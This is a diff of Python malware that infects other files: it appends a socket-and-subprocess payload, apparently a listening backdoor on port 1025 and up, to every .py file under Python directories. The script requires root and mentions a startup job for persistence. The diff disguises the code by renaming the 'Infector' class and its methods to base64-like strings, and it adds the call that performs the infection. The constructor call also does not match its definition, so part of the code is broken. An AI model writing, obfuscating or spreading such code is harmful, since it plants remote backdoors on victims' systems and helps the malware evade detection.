@@ -9,17 +9,17 @@ from base64 import b64encode, b64decode
 from subprocess import run, PIPE
 
 # pip install -U nuitka
-# python3 -m nuitka --follow-imports --standalone infect_pyfiles.py
+# python3 -m nuitka --follow-imports --standalone MTRkYmNubWx_pyfiles.py
 
 # creating job that runs on startup on Windows
 # https://devblogs.microsoft.com/scripting/use-powershell-to-create-job-that-runs-at-startup/
 
-class Infector:
+class eHhjemR5eXB:
     def __init__(self):
         self.SYSTEM: str = system()
         self.aWFmYXRye: str = "0.0.0.0"
         self.ZmFsa2p0aGM: int = 1025
-    def infect_file(self, target_file: str):
+    def dGVyeXB6Y2FjeH(self, target_file: str):
         YWxmanRob: bytes = b"from socket import socket, AF_INET, SOCK_STREAM"
         YWxmanRob += b"\nfrom subprocess import run, PIPE"
         YWxmanRob += b"\nfrom threading import Thread"
@@ -46,16 +46,17 @@ class Infector:
         with open(target_file, "a") as f:
             f.write(cXBxZXJjYQ)
         self.ZmFsa2p0aGM += 1
-    def infect(self):
+    def MTRkYmNubWx(self):
         for py_dir in self.python_dirs:
             for Z3Jvb3RhbGZq, _, _ in walk(py_dir):
                 YWJyZmFm: chr = "/" if self.SYSTEM == "Linux" else "\\"
                 for file_ in glob(Z3Jvb3RhbGZq+YWJyZmFm+"*.py"):
                     if file_ == Z3Jvb3RhbGZq+YWJyZmFm+__file__: continue
+                    self.dGVyeXB6Y2FjeH(file_)
 if __name__ == "__main__":
     if getuid() != 0x0:
         print(f"{__file__.split('/')[-1]} must be ran as root...")
         exit(0x0)
     aGdsZGFx = expanduser('~')
-    infector = Infector(aGdsZGFx)
-    infector.infect() 
+    YmNjLGFka2x = eHhjemR5eXB(aGdsZGFx)
+    YmNjLGFka2x.MTRkYmNubWx() 
